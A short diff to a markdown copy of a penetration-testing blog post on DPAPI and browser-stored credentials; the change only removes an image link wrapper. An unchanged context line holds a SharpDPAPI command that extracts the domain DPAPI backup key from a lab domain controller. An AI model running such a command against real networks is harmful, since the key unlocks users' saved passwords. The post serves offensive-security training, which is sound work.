@@ -69,7 +69,7 @@ Similarly, this activity can be performed by SharpDPAPI. If no .pvk file is spec
 dotnet inline-execute SharpDPAPI.exe backupkey /nowrap /server:dc.red.lab
 ```
 
-[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key.png)
+[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key.png?w=1024)
 
 DPAPI Domain Backup Key
 
